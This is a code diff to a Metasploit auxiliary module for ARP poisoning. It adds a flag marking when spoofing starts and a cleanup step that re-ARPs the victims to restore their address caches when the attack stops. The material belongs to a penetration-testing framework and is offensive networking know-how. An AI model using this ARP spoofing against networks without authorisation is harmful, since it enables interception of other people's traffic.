@@ -61,6 +61,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
+		@spoofing = false
 		# The local dst (and src) cache(s)
 		@dsthosts_cache = {}
 		@srchosts_cache = {}
@@ -89,16 +90,60 @@ class Metasploit3 < Msf::Auxiliary
 			else
 				arp_poisoning
 			end
-			close_pcap()
-		rescue
-			print_error( $!.message)
+
+		rescue  =>  ex
+			print_error( ex.message)
 		ensure
+
 			if datastore['LISTENER']
 				@listener.kill if @listener
 				GC.start()
 			end
-			close_pcap()
-		end
+
+			if capture and  @spoofing and not datastore['BROADCAST']
+				print_status("RE-ARPing the victims...")
+				3.times do 					
+					@dsthosts_cache.keys.sort.each do |dhost|
+						dmac = @dsthosts_cache[dhost] 
+						if datastore['BIDIRECTIONAL']
+							@srchosts_cache.keys.sort.each do |shost|
+								smac = @srchosts_cache[shost] 
+								if shost != dhost
+									print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
+									reply = buildreply(shost, smac, dhost, dmac)
+									capture.inject(reply)
+									Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
+								end
+							end
+						else
+							@shosts.each do |shost|
+								if shost != dhost
+									print_status("Sending arp request for #{shost} to #{dhost}") if datastore['VERBOSE']
+									request = buildprobe(dhost, dmac, shost)
+									capture.inject(request)
+									Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
+								end
+							end
+						end
+					end
+					if datastore['BIDIRECTIONAL']
+						@srchosts_cache.keys.sort.each do |shost|
+							smac = @srchosts_cache[shost]
+							@dsthosts_cache.keys.sort.each do |dhost|
+								dmac = @dsthosts_cache[dhost] 
+								if shost != dhost
+									print_status("Sending arp packet for #{dhost} to #{shost}") if datastore['VERBOSE']
+									reply = buildreply(dhost, dmac, shost, smac)
+									capture.inject(reply)
+									Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
+								end
+							end
+						end
+					end
+				end # 3.times
+			end 
+			close_pcap
+		end #begin/rescue/ensure
 	end
 
 	def broadcast_spoof
@@ -213,6 +258,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		#Do the job until user interupt it
 		print_status("ARP poisonning in progress...")
+		@spoofing = true
 		while(true)
 			if datastore['AUTO_ADD']
 				@mutex_cache.lock			
